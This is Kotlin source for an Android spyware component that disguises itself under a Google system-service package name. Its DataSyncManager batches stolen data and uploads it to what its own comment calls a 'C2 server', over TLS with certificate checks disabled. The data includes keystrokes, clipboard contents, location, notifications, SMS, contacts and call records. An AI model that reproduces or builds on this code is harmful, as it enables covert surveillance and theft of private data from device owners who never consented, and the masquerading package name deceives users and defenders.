package com.google.android.systemservice.utils

import android.content.Context
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

/**
 * Syncs offline-queued data to the C2 server when connection is restored.
 * Called by CommandService on successful reconnect.
 */
class DataSyncManager(private val context: Context) {

    companion object {
        private const val TAG = "DataSync"
        private const val BATCH_SIZE = 50
    }

    private val queue = OfflineDataQueue(context)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /**
     * Enqueue data for offline storage. Called when HTTP upload fails.
     */
    fun enqueueOffline(type: String, jsonPayload: String) {
        queue.enqueue(type, jsonPayload, AndroidConfig.deviceId)
    }

    /**
     * Check if there's queued data waiting.
     */
    fun hasQueuedData(): Boolean = queue.hasQueuedData()

    /**
     * Get total queued item count.
     */
    fun queuedCount(): Int = queue.totalQueuedCount()

    /**
     * Flush all queued data to server. Call on reconnect.
     * Returns number of successfully uploaded items.
     */
    fun flushAll(onComplete: ((Int) -> Unit)? = null) {
        scope.launch {
            var totalUploaded = 0
            try {
                val allQueued = queue.getAllQueued()
                if (allQueued.isEmpty()) {
                    Log.d(TAG, "No queued data to sync")
                    onComplete?.invoke(0)
                    return@launch
                }

                Log.d(TAG, "Starting sync: ${allQueued.values.sumOf { it.size }} items across ${allQueued.size} types")

                for ((type, items) in allQueued) {
                    val uploaded = uploadBatch(type, items)
                    totalUploaded += uploaded
                    if (uploaded == items.size) {
                        queue.clearType(type)
                    }
                }

                Log.d(TAG, "Sync complete: $totalUploaded items uploaded")
            } catch (e: Exception) {
                Log.e(TAG, "Sync failed: ${e.message}")
            }
            onComplete?.invoke(totalUploaded)
        }
    }

    /**
     * Flush queued data and block until complete.
     */
    suspend fun flushAllSuspend(): Int {
        var result = 0
        val job = scope.launch {
            val allQueued = queue.getAllQueued()
            for ((type, items) in allQueued) {
                val uploaded = uploadBatch(type, items)
                result += uploaded
                if (uploaded == items.size) {
                    queue.clearType(type)
                }
            }
        }
        job.join()
        return result
    }

    private suspend fun uploadBatch(type: String, items: List<OfflineDataQueue.QueueItem>): Int {
        val endpoint = getEndpointForType(type)
        if (endpoint == null) {
            Log.w(TAG, "Unknown type: $type, skipping")
            return 0
        }

        var uploaded = 0
        val batches = items.chunked(BATCH_SIZE)

        for (batch in batches) {
            try {
                val jsonArray = JSONArray()
                batch.forEach { item ->
                    try {
                        jsonArray.put(JSONObject(item.payload))
                    } catch (e: Exception) {
                        // If single payload is not valid JSON, wrap it
                        val wrapper = JSONObject()
                        wrapper.put("data", item.payload)
                        wrapper.put("timestamp", item.timestamp)
                        wrapper.put("device_id", item.deviceId)
                        jsonArray.put(wrapper)
                    }
                }

                val body = JSONObject().apply {
                    put("device_id", AndroidConfig.deviceId)
                    put("batch", jsonArray)
                    put("queued_count", batch.size)
                    put("sync_type", "offline_flush")
                }

                val client = TrustAllCertificates.createClientBuilder().build()
                val request = Request.Builder()
                    .url("${AndroidConfig.apiBaseUrl}/$endpoint")
                    .post(body.toString().toRequestBody("application/json".toMediaType()))
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        uploaded += batch.size
                        Log.d(TAG, "Uploaded batch of ${batch.size} $type items")
                    } else {
                        Log.w(TAG, "Batch upload failed for $type: ${response.code}")
                        return uploaded // Stop on failure, will retry next time
                    }
                }

                // Small delay between batches to avoid overwhelming server
                delay(200)
            } catch (e: Exception) {
                Log.e(TAG, "Batch upload error for $type: ${e.message}")
                return uploaded
            }
        }

        return uploaded
    }

    private fun getEndpointForType(type: String): String? {
        return when (type) {
            "keylog" -> "keylogger"
            "clipboard" -> "clipboard"
            "location" -> "location"
            "notification" -> "notifications"
            "sms" -> "sms"
            "contacts" -> "contacts"
            "calls" -> "calls"
            else -> null
        }
    }

    /**
     * Persist in-memory queue to disk (call in onDestroy/onLowMemory).
     */
    fun persistQueue() {
        queue.persistToDisk()
    }
}
